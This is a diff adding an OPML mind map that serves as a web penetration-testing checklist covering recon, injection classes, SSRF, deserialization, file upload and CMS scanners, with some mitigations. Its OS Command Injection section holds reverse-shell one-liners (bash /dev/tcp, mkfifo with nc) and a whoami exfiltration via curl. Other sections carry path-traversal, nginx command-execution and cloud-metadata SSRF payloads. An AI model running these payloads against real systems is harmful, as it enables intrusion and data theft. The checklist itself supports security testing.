@@ -1,0 +1,502 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<opml version="1.0">
+	<head>
+		<dateCreated>Wed Oct 27 2021 12:38:03 GMT-0700 (Pacific Daylight Time)</dateCreated>
+		<dateModified>Wed Oct 27 2021 12:38:03 GMT-0700 (Pacific Daylight Time)</dateModified>
+	</head>
+	<body>
+		<outline text="WEB HACKING">
+			<outline text="Content Discovery">
+				<outline text="Identify Web technology">
+					<outline text="Wappalyzer"></outline>
+					<outline text="Common filetypes">
+						<outline text="html"></outline>
+						<outline text="php"></outline>
+						<outline text="aspx"></outline>
+						<outline text="txt"></outline>
+						<outline text="js"></outline>
+						<outline text="bak"></outline>
+					</outline>
+					<outline text="X-Powered-By HTTP Header"></outline>
+					<outline text="Server HTTP Header"></outline>
+				</outline>
+				<outline text="feroxbuster / gobuster"></outline>
+				<outline text="Review JavaScript Files">
+					<outline text="https://lelinhtinh.github.io/de4js/" type="link" _url="https://lelinhtinh.github.io/de4js/"></outline>
+					<outline text="Search for .map files"></outline>
+				</outline>
+				<outline text="Review HTML code"></outline>
+				<outline text="Spiders">
+					<outline text="gospider"></outline>
+				</outline>
+				<outline text="Identify directory and filename patterns"></outline>
+				<outline text="Read metadata of files (PDF/Images) to identify Author, E-mails, Software used">
+					<outline text="exiftool"></outline>
+					<outline text="foca"></outline>
+				</outline>
+				<outline text="robots.txt"></outline>
+				<outline text="sitemap.xml"></outline>
+				<outline text="If target company has mobile applications, download and inspect them.
+Often API endpoints, special HTTP Headers and other useful information can be obtained."></outline>
+			</outline>
+			<outline text="Open Source Intelligence (OSINT)">
+				<outline text="Github, Gitlab, Bitbucket, Jenkins"></outline>
+				<outline text="Wayback Machine"></outline>
+				<outline text="Certificate search"></outline>
+				<outline text="shodan etc"></outline>
+				<outline text="social media: linkedin, facebook, twitter, youtube, tiktok, instagram"></outline>
+				<outline text="Google Dorks"></outline>
+				<outline text="Job Applications">
+					<outline text="Software used"></outline>
+					<outline text="Programming languages"></outline>
+				</outline>
+				<outline text="3rd party API Keys
+https://github.com/streaak/keyhacks" type="link" _url="https://github.com/streaak/keyhacks"></outline>
+			</outline>
+			<outline text="Subdomain Enumeration">
+				<outline text="SSL"></outline>
+				<outline text="Google Dorks"></outline>
+				<outline text="Bruteforce">
+					<outline text="gobuster dns"></outline>
+					<outline text="ffuf -H &quot;Host: FUZZ.domain.com&quot;"></outline>
+					<outline text="amass"></outline>
+					<outline text="massdns"></outline>
+				</outline>
+			</outline>
+			<outline text="HTTP VERBS">
+				<outline text="OPTIONS"></outline>
+				<outline text="GET"></outline>
+				<outline text="POST"></outline>
+				<outline text="PUT"></outline>
+				<outline text="DELETE"></outline>
+				<outline text="MOVE"></outline>
+				<outline text="PATCH"></outline>
+				<outline text="INSERT (ARBITRARY VALUE)"></outline>
+				<outline text="HELP"></outline>
+			</outline>
+			<outline text="Change Request Method">
+				<outline text="Provide parameters in GET"></outline>
+			</outline>
+			<outline text="Change Content-Type">
+				<outline text="JSON =&gt; XML">
+					<outline text="https://codebeautify.org/xmltojson" type="link" _url="https://codebeautify.org/xmltojson"></outline>
+					<outline text="https://www.oxygenxml.com/xml_json_converter.html" type="link" _url="https://www.oxygenxml.com/xml_json_converter.html"></outline>
+				</outline>
+			</outline>
+			<outline text="HTTP Headers">
+				<outline text="Common Headers">
+					<outline text="X-Requested-For"></outline>
+					<outline text="X-Real-IP"></outline>
+					<outline text="X-Forwarded-Host"></outline>
+					<outline text="Forwarded: For=&quot;[2001:db8:cafe::17]:4711&quot;"></outline>
+					<outline text="X-Client-IP"></outline>
+					<outline text="X-Forwarded-For: &lt;clientIP&gt;[, &lt;proxyIP1&gt;, &lt;proxy2IP&gt;]"></outline>
+					<outline text="X-Forwarded-By"></outline>
+					<outline text="X-Remote-Addr"></outline>
+					<outline text="X-Remote-IP"></outline>
+					<outline text="X-Wap-Profile: &lt;URL-to-XML-file&gt;"></outline>
+					<outline text="Via: [ &lt;protocol-name&gt; &quot;/&quot; ] &lt;protocol-version&gt; &lt;host&gt; [ &quot;:&quot; &lt;port&gt; ]"></outline>
+					<outline text="Range: &lt;unit&gt;=&lt;range-start&gt;-[&lt;range-end&gt;]"></outline>
+				</outline>
+				<outline text="Custom Headers"></outline>
+				<outline text="BurpCollaboratorEverywhere (SSRF)"></outline>
+				<outline text="Differrent User-Agent">
+					<outline text="Windows"></outline>
+					<outline text="Linux"></outline>
+					<outline text="Android"></outline>
+					<outline text="Custom Value (injection?)"></outline>
+				</outline>
+				<outline text="Duplicate Host Header"></outline>
+				<outline text="Some implementations might be parsing HTTP Headers like &quot;User-Agent&quot; in an insecure manner ">
+					<outline text="Command Injection">
+						<outline text="Shellshock"></outline>
+					</outline>
+					<outline text="SSRF">
+						<outline text="BurpCollaboratorEverywhere"></outline>
+					</outline>
+					<outline text="SQLi"></outline>
+				</outline>
+				<outline text="Origin overwrite"></outline>
+			</outline>
+			<outline text="HTTP Security Headers">
+				<outline text="Security headers are HTTP headers that enable the server to influence the behavior of the browser from a security perspective."></outline>
+				<outline text="Content Security Policy (CSP)">
+					<outline text="Set of directives that restrict how a webpage loads resources, such as scripts and media files.
+Protection against XSS attacks"></outline>
+					<outline text="Using &apos;unsafe-inline&apos; allows execution of third-party JavaScript inline. It is better to use hashes or nonces for the inline scripts."></outline>
+					<outline text="Using &apos;unsafe-eval&apos; allows execution of untrusted JavaScript at runtime with eval."></outline>
+				</outline>
+				<outline text="HTTP Strict Transport Security (HSTS)">
+					<outline text="Website accessed only via HTTPS"></outline>
+					<outline text="Strict-Transport-Security: max-age=31536000 ; includeSubDomains"></outline>
+				</outline>
+				<outline text="X-Frame-Options">
+					<outline text="Protection against Clickjacking / UI redressing attacks by limiting what can be rendered in a frame."></outline>
+					<outline text="Setting X-Frame-Options inside the &lt;meta&gt; element is useless and has no effect on security."></outline>
+					<outline text="X-Frame-Options: DENY
+or X-Frame-Options: SAMEORIGIN"></outline>
+				</outline>
+				<outline text="X-Content-Type-Options">
+					<outline text="Stops a browser from trying to MIME-sniff the content type and forces it to stick with the declared content-type. (Content-Sniffing)"></outline>
+					<outline text="X-Content-Type-Options: nosniff"></outline>
+				</outline>
+				<outline text="X-XSS-Protection">
+					<outline text="X-XSS-Protection: 1; mode=block
+Enable the filter, but prevent the page from rendering rather than sanitizing it when an attack is detected."></outline>
+				</outline>
+				<outline text="Cross-Origin Resource Sharing (CORS)">
+					<outline text="Controls whether and how content running on other origins can interact with the origin that publishes the policy."></outline>
+				</outline>
+				<outline text="Cache-Control">
+					<outline text="Specify directives for caching mechanisms in both requests and responses."></outline>
+					<outline text="Cache-Control: no-store"></outline>
+					<outline text="Pragma: no-cache
+Backwards compatibility with HTTP/1.0"></outline>
+					<outline text="Note: Some clients might not obey to these HTTP headers sent by the server - so DO NOT rely solely on this header to solve caching issues. Make sure that all data are sufficiently encrypted."></outline>
+				</outline>
+				<outline text="https://securityheaders.com/" type="link" _url="https://securityheaders.com/"></outline>
+				<outline text="https://redbot.org/" type="link" _url="https://redbot.org/#"></outline>
+				<outline text="https://headerinspector.com/" type="link" _url="https://headerinspector.com/"></outline>
+				<outline text="https://owasp.org/www-project-secure-headers/" type="link" _url="https://owasp.org/www-project-secure-headers/"></outline>
+				<outline text="https://www.netsparker.com/whitepaper-http-security-headers/" type="link" _url="https://www.netsparker.com/whitepaper-http-security-headers/"></outline>
+				<outline text="https://observatory.mozilla.org/" type="link" _url="https://observatory.mozilla.org/"></outline>
+			</outline>
+			<outline text="HTTP Parameters">
+				<outline text="ParamMiner"></outline>
+			</outline>
+			<outline text="HTTP Parameter Pollution">
+				<outline text="id=1&amp;id=2"></outline>
+			</outline>
+			<outline text="Password Reset">
+				<outline text="User Enumeration"></outline>
+				<outline text="Missing Rate Limiting"></outline>
+				<outline text="Password Reset Poisoning via Host Header Injection"></outline>
+				<outline text="Re-usable Password Reset Token"></outline>
+				<outline text="No Expiration on Password Reset Token"></outline>
+				<outline text="Guessable Password Reset Token"></outline>
+				<outline text="IDN Homograph Attack"></outline>
+				<outline text="Weak Password Policy"></outline>
+			</outline>
+			<outline text="Information Disclosure">
+				<outline text="Generate an error">
+					<outline text="Special characters (format strings, etc)"></outline>
+					<outline text="HTTP Parameters">
+						<outline text="Change type to array ( ?id= to ?id[]= )"></outline>
+						<outline text="Missing parameters"></outline>
+						<outline text="Parameter Pollution"></outline>
+					</outline>
+					<outline text="Non existing page =&gt; 404"></outline>
+					<outline text="Very long session/cookies"></outline>
+				</outline>
+				<outline text="HTML code review"></outline>
+				<outline text="JS code review">
+					<outline text="Search for &quot;.map&quot; files"></outline>
+					<outline text="https://lelinhtinh.github.io/de4js/" type="link" _url="https://lelinhtinh.github.io/de4js/"></outline>
+				</outline>
+			</outline>
+			<outline text="Path Traversal">
+				<outline text="NGINX">
+					<outline text="nginx.conf"></outline>
+					<outline text="location /path misconfiguration"></outline>
+					<outline text="vulnerable.site/path..%2f..%2f..%2f..%2fetc%2fpasswd"></outline>
+				</outline>
+				<outline text="Filter Bypass">
+					<outline text="Unicode UTF-8, UTF-32"></outline>
+					<outline text="Codepoints: &amp;#32;"></outline>
+					<outline text="URL Encoding: %2e%2e%2f"></outline>
+					<outline text="Double URL Encoding"></outline>
+				</outline>
+			</outline>
+			<outline text="Web Servers">
+				<outline text="Apache">
+					<outline text="/etc/apache2/apache2.conf"></outline>
+					<outline text="/etc/apache2/envvars"></outline>
+					<outline text="/etc/apache2/sites-enabled/000-default.conf"></outline>
+					<outline text="/var/log/apache2/error.log"></outline>
+				</outline>
+				<outline text="NGINX">
+					<outline text="/etc/nginx/nginx.conf"></outline>
+					<outline text="/etc/nginx/locations.conf"></outline>
+					<outline text="/etc/nginx/server.conf"></outline>
+					<outline text="/etc/nginx/sites-enabled/default"></outline>
+					<outline text="/usr/share/nginx/modules/ngx_http_execute_module.so"></outline>
+					<outline text="location /path misconfiguration"></outline>
+					<outline text="Command Execution
+nginx.conf: command on;
+PoC: curl -g &quot;http://&lt;IP&gt;:&lt;PORT&gt;?system.run[whoami]&quot;"></outline>
+					<outline text="https://github.com/yandex/gixy" type="link" _url="https://github.com/yandex/gixy"></outline>
+				</outline>
+				<outline text="NodeJS">
+					<outline text=" var http = require(&apos;http&apos;);"></outline>
+				</outline>
+			</outline>
+			<outline text="LDAP Injection"></outline>
+			<outline text="XPATH Injection">
+				<outline text="https://xcat.readthedocs.io/en/latest/" type="link" _url="https://xcat.readthedocs.io/en/latest/"></outline>
+				<outline text="https://maxtoroq.github.io/xpath-ref/" type="link" _url="https://maxtoroq.github.io/xpath-ref/"></outline>
+			</outline>
+			<outline text="OS Command Injection">
+				<outline text="dig &lt;burpcollab&gt;"></outline>
+				<outline text="curl $(whoami).&lt;burpcollab&gt;"></outline>
+				<outline text="/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&quot;"></outline>
+				<outline text="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f"></outline>
+				<outline text="echo base64payload | base64 -d | bash"></outline>
+				<outline text="If spaces are filtered these tricks could be used:
+- $IFS
+- {ls,-la}
+- cat&lt;/etc/passwd
+- $&apos;\x20&apos;, $&apos;\040, $&apos;\u20&apos;&apos;"></outline>
+			</outline>
+			<outline text="SQL Injection">
+				<outline text="Mitigation:
+- Parameterized Queries
+- Prepared Statements
+- Input Validation"></outline>
+				<outline text="Identify number of columns">
+					<outline text="UNION SELECT NULL, NULL, NULL, NULL; -- -"></outline>
+				</outline>
+				<outline text="Identify columns data types and which columns are visible"></outline>
+				<outline text="Identify Database type (MySQL, PostgreSQL, ...) and version"></outline>
+				<outline text="sqlmap"></outline>
+				<outline text="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" type="link" _url="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/"></outline>
+			</outline>
+			<outline text="SQL Truncation Attack">
+				<outline text="SQL Database truncates user input due to a length restriction."></outline>
+			</outline>
+			<outline text="NOSQL Injection">
+				<outline text="NoSQLMap"></outline>
+			</outline>
+			<outline text="XML eXternal Entities (XXE)">
+				<outline text="XML parsers are configured with &quot;Resolve External Entities&quot; feature enabled."></outline>
+				<outline text="OOB (Out of Band)">
+					<outline text="xxe.sh"></outline>
+				</outline>
+				<outline text="OXML_XXE (https://github.com/BuffaloWill/oxml_xxe)" type="link" _url="https://github.com/BuffaloWill/oxml_xxe">
+					<outline text="OOXML (DOCX, XLSX, PPTX), ODF, PDF, RSS"></outline>
+				</outline>
+			</outline>
+			<outline text="Template Injection (SSTI)">
+				<outline text="Python">
+					<outline text="Jinja2"></outline>
+					<outline text="PoC Payload: {{7*7}} or {{ env }}"></outline>
+				</outline>
+				<outline text="PHP">
+					<outline text="Twig"></outline>
+				</outline>
+				<outline text="Golang">
+					<outline text="Method Confusion
+PoC Payload: {{ . }}"></outline>
+				</outline>
+			</outline>
+			<outline text="File Inclusion (LFI/RFI)">
+				<outline text="Wrappers">
+					<outline text="phar://"></outline>
+					<outline text="zlib://"></outline>
+					<outline text="file://"></outline>
+					<outline text="ogg://"></outline>
+					<outline text="expect://"></outline>
+					<outline text="glob://"></outline>
+					<outline text="data://"></outline>
+					<outline text="php://">
+						<outline text="php://filter/convert.base64-encode/resource="></outline>
+					</outline>
+				</outline>
+				<outline text="Log Poisoning">
+					<outline text="/var/log/apache2/error.log"></outline>
+				</outline>
+				<outline text="Session Poisoning"></outline>
+				<outline text="Interesting Files">
+					<outline text="/etc/nginx/nginx.conf"></outline>
+					<outline text="/etc/nginx/sites-enabled/default"></outline>
+					<outline text="/etc/apache2/apache2.conf"></outline>
+					<outline text="/etc/apache2/envvars"></outline>
+					<outline text="/etc/apache2/sites-enabled/000-default.conf"></outline>
+					<outline text="/var/log/apache2/error.log"></outline>
+				</outline>
+			</outline>
+			<outline text="Race Conditions (TOCTOU)">
+				<outline text="Turbo Intruder"></outline>
+				<outline text="Usually the application performs a check before accessing the file."></outline>
+				<outline text="Use mkstemp() instead of mktemp()"></outline>
+				<outline text="Usually exploited using symbolic link attack"></outline>
+			</outline>
+			<outline text="Server Side Request Forgery (SSRF)">
+				<outline text="gopher:// URL Scheme allows smuggling data to other protocols (e.g: SMTP)"></outline>
+				<outline text="Filter Bypass">
+					<outline text="127.0.0.1.nip.io"></outline>
+					<outline text="localhost == [::]"></outline>
+					<outline text="decimal notation 127.0.0.1 == 2130706433"></outline>
+					<outline text="IPv6/IPv4 Embedding [0:0:0:0:0:ffff:127.0.0.1]"></outline>
+				</outline>
+				<outline text="Cloud">
+					<outline text="AWS:
+http://169.254.169.254/latest/meta-data"></outline>
+					<outline text="Alibaba:
+http://100.100.100.200/latest/meta-data/"></outline>
+					<outline text="Oracle Cloud:
+http://192.0.0.192/latest/meta-data/"></outline>
+					<outline text="Digital Ocean:
+http://169.254.169.254/metadata/v1.json"></outline>
+				</outline>
+			</outline>
+			<outline text="Request Smuggling">
+				<outline text="Smuggler"></outline>
+			</outline>
+			<outline text="CRLF Injection (Response Splitting)">
+				<outline text="CAPEC-34" type="link" _url="https://capec.mitre.org/data/definitions/34.html"></outline>
+				<outline text="XSS"></outline>
+				<outline text="Web Cache Poisoning"></outline>
+				<outline text="Browser Cache Poisoning"></outline>
+				<outline text="Information Disclosure"></outline>
+			</outline>
+			<outline text="Insecure Deserialization">
+				<outline text="Check all user controlled input">
+					<outline text="Cookies / Sessions"></outline>
+					<outline text="HTTP Parameters"></outline>
+					<outline text="HTTP Headers"></outline>
+					<outline text="Remote Method Invocation (RMI)"></outline>
+				</outline>
+				<outline text="Python">
+					<outline text="Pickle">
+						<outline text="Pickle can be signed before storage or transmission, and its signature can be verified before loading it on the receiver side."></outline>
+						<outline text="__reduce_ex__ / __reduce__ magic methods"></outline>
+					</outline>
+					<outline text="PyYAML load"></outline>
+				</outline>
+				<outline text="Java">
+					<outline text="Magic Numbers &quot;AC ED 00 05&quot;"></outline>
+					<outline text="Java-Deserialization-Cheat-Sheet"></outline>
+					<outline text="ysoserial"></outline>
+					<outline text="XMLDecoder"></outline>
+					<outline text="XStream-&gt;fromXML"></outline>
+					<outline text="ObjectInputStream">
+						<outline text="ObjectInputStream-&gt;readExternal"></outline>
+						<outline text="ObjectInputStream-&gt;readResolve"></outline>
+						<outline text="ObjectInputStream-&gt;readObject"></outline>
+						<outline text="ObjectInputStream-&gt;readUnshared"></outline>
+					</outline>
+					<outline text="Content-Type: application/x-java-serialized-object"></outline>
+					<outline text="resolveClass method is responsible to &quot;unserialize&quot; the class. As a defense-in-depth countermeasure, we can extend the base class &quot;java.io.ObjectInputStream&quot; and override the &quot;resolveClass&quot; method, to also apply checks that the deserialized data will be in fact of the expected class."></outline>
+				</outline>
+				<outline text="Ruby">
+					<outline text="unmarshal"></outline>
+				</outline>
+				<outline text="PHP">
+					<outline text="unserialize"></outline>
+					<outline text="phpggc"></outline>
+				</outline>
+				<outline text="Never trust user controlled data.
+Apply integrity checks to ensure that server generated (trusted) data have not been tampered."></outline>
+			</outline>
+			<outline text="Cross Site Scripting (XSS)">
+				<outline text="Input validation bug. Never trust user input."></outline>
+				<outline text="- Reflected XSS
+- Stored XSS
+- DOM-based XSS"></outline>
+				<outline text="Same Origin Policy (SOP)"></outline>
+				<outline text="Cross Origin Resource Sharing (CORS)"></outline>
+				<outline text="Check for Request Splitting">
+					<outline text="Add CORS related HTTP Header to allow XSS"></outline>
+				</outline>
+			</outline>
+			<outline text="Tab Nabbing">
+				<outline text="The page we are linking in new tab has partial access to the parent linker via window.opener.location object. Therefore the new page can overwrite the location of the previous (or parent linker) and open a phishing page or execute a javascript."></outline>
+				<outline text="Note that this also works when index.html and malicious.html are on different origins — window.opener.location is accessible across origins!"></outline>
+				<outline text="Useful in Social Engineering / Phishing attacks"></outline>
+				<outline text="Vulnerable to tabnabbing attack:
+&lt;a href=&quot;URL&quot; target=&quot;_blank&quot;&gt;"></outline>
+				<outline text="Mitigation:
+target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;"></outline>
+				<outline text="https://blog.0xprashant.in/posts/htb-bug/" type="link" _url="https://blog.0xprashant.in/posts/htb-bug/"></outline>
+				<outline text="https://mathiasbynens.github.io/rel-noopener/" type="link" _url="https://mathiasbynens.github.io/rel-noopener/"></outline>
+				<outline text="https://cybersins.com/target-blank-vulnerability-phishing/" type="link" _url="https://cybersins.com/target-blank-vulnerability-phishing/"></outline>
+			</outline>
+			<outline text="File Upload">
+				<outline text="WebDAV">
+					<outline text="cadaver"></outline>
+					<outline text="davtest"></outline>
+					<outline text="curl -T file.txt http://&lt;IP&gt;"></outline>
+					<outline text="HTTP MOVE"></outline>
+				</outline>
+				<outline text="web.config (ASP.NET)">
+					<outline text="Make specific file extensions executable (e.g: execute txt files)"></outline>
+					<outline text="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/" type="link" _url="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/"></outline>
+				</outline>
+				<outline text=".htaccess (Apache)">
+					<outline text="Make specific file extensions executable (e.g: execute txt files)"></outline>
+					<outline text="https://github.com/wireghoul/htshells" type="link" _url="https://github.com/wireghoul/htshells"></outline>
+				</outline>
+				<outline text="Content-Type filter bypass"></outline>
+				<outline text="Magic Bytes filter bypass"></outline>
+				<outline text="Double Extensions filter bypass"></outline>
+				<outline text="Alternative extensions blacklist filter bypass"></outline>
+			</outline>
+			<outline text="Prototype Pollution">
+				<outline text="https://github.com/detectify/page-fetch" type="link" _url="https://github.com/detectify/page-fetch"></outline>
+			</outline>
+			<outline text="Content Management Systems (CMS)">
+				<outline text="Wordpress">
+					<outline text="wpscan" type="link" _url="https://github.com/wpscanteam/wpscan"></outline>
+					<outline text="Droopescan" type="link" _url="https://github.com/droope/droopescan"></outline>
+					<outline text="CMSmap" type="link" _url="https://github.com/Dionach/CMSmap"></outline>
+					<outline text="CMSeeK" type="link" _url="https://github.com/Tuhinshubhra/CMSeeK"></outline>
+					<outline text="WPXF" type="link" _url="https://github.com/rastating/wordpress-exploit-framework"></outline>
+				</outline>
+				<outline text="Joomla">
+					<outline text="joomscan" type="link" _url="https://github.com/OWASP/joomscan"></outline>
+					<outline text="Droopescan" type="link" _url="https://github.com/droope/droopescan"></outline>
+					<outline text="CMSmap" type="link" _url="https://github.com/Dionach/CMSmap"></outline>
+					<outline text="CMSeeK" type="link" _url="https://github.com/Tuhinshubhra/CMSeeK"></outline>
+					<outline text="JoomlaVS" type="link" _url="https://github.com/rastating/joomlavs"></outline>
+				</outline>
+				<outline text="Drupal">
+					<outline text="Droopescan" type="link" _url="https://github.com/droope/droopescan"></outline>
+					<outline text="CMSmap" type="link" _url="https://github.com/Dionach/CMSmap"></outline>
+					<outline text="Drupwn" type="link" _url="https://github.com/immunIT/drupwn"></outline>
+					<outline text="CMSeeK" type="link" _url="https://github.com/Tuhinshubhra/CMSeeK"></outline>
+				</outline>
+			</outline>
+			<outline text="Fuzzing">
+				<outline text="Note: ffuf  by default doesn&apos;t match HTTP Status 50x which are of high interest when fuzzing for vulnerabilities.
+Run with flag: &quot;-mc all&quot;"></outline>
+			</outline>
+			<outline text="Session Fixation">
+				<outline text="The attack consists of obtaining a valid session ID (e.g. by connecting to the application), inducing a user to authenticate himself with that session ID, and then hijacking the user-validated session by the knowledge of the used session ID."></outline>
+				<outline text="Session token in the URL argument"></outline>
+				<outline text="Session token in a hidden form field"></outline>
+				<outline text="Session ID in a cookie"></outline>
+				<outline text="https://secureteam.co.uk/articles/web-application-security-articles/understanding-session-fixation-attacks/" type="link" _url="https://secureteam.co.uk/articles/web-application-security-articles/understanding-session-fixation-attacks/"></outline>
+			</outline>
+			<outline text="Session Hijacking"></outline>
+			<outline text="Web Cache Poisoning">
+				<outline text="https://portswigger.net/web-security/web-cache-poisoning" type="link" _url="https://portswigger.net/web-security/web-cache-poisoning"></outline>
+			</outline>
+			<outline text="Bruteforce Attacks"></outline>
+			<outline text="CSV Injection"></outline>
+			<outline text="Tools">
+				<outline text="https://gchq.github.io/CyberChef/" type="link" _url="https://gchq.github.io/CyberChef/"></outline>
+				<outline text="https://lelinhtinh.github.io/de4js/" type="link" _url="https://lelinhtinh.github.io/de4js/"></outline>
+				<outline text="https://xcat.readthedocs.io/en/latest/" type="link" _url="https://xcat.readthedocs.io/en/latest/"></outline>
+				<outline text="https://github.com/detectify/page-fetch" type="link" _url="https://github.com/detectify/page-fetch"></outline>
+				<outline text="OXML_XXE (https://github.com/BuffaloWill/oxml_xxe)" type="link" _url="https://github.com/BuffaloWill/oxml_xxe"></outline>
+				<outline text="wpscan" type="link" _url="https://github.com/wpscanteam/wpscan"></outline>
+				<outline text="Droopescan" type="link" _url="https://github.com/droope/droopescan"></outline>
+				<outline text="CMSmap" type="link" _url="https://github.com/Dionach/CMSmap"></outline>
+				<outline text="CMSeeK" type="link" _url="https://github.com/Tuhinshubhra/CMSeeK"></outline>
+				<outline text="WPXF" type="link" _url="https://github.com/rastating/wordpress-exploit-framework"></outline>
+				<outline text="joomscan" type="link" _url="https://github.com/OWASP/joomscan"></outline>
+				<outline text="JoomlaVS" type="link" _url="https://github.com/rastating/joomlavs"></outline>
+				<outline text="Drupwn" type="link" _url="https://github.com/immunIT/drupwn"></outline>
+				<outline text="https://github.com/wireghoul/htshells" type="link" _url="https://github.com/wireghoul/htshells"></outline>
+				<outline text="https://github.com/yandex/gixy" type="link" _url="https://github.com/yandex/gixy"></outline>
+				<outline text="https://securityheaders.com/" type="link" _url="https://securityheaders.com/"></outline>
+			</outline>
+			<outline text="Cheat Sheets">
+				<outline text="https://github.com/swisskyrepo/PayloadsAllTheThings" type="link" _url="https://github.com/swisskyrepo/PayloadsAllTheThings"></outline>
+				<outline text="https://book.hacktricks.xyz" type="link" _url="https://book.hacktricks.xyz"></outline>
+				<outline text="https://maxtoroq.github.io/xpath-ref/" type="link" _url="https://maxtoroq.github.io/xpath-ref/"></outline>
+				<outline text="https://0xsp.com/" type="link" _url="https://0xsp.com/"></outline>
+			</outline>
+		</outline>
+	</body>
+</opml>
